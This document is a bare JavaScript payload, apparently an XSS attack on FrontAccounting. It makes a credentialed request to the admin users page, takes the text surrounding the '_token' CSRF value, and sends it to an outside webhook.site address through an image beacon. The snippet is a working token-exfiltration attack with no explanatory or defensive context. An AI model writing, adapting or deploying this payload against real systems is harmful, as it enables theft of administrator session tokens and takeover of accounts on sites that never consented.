var r = new XMLHttpRequest();
r.open('GET', '/frontaccounting/admin/users.php', false);
r.withCredentials = true;
r.send();

var raw = r.responseText;

// Find where _token appears in the response
var idx = raw.indexOf('_token');
var around = raw.substring(idx - 10, idx + 80);

new Image().src = 'https://webhook.site/69f1700e-aa89-468d-ad8a-19eba9a9704f/?around=' + encodeURIComponent(around);
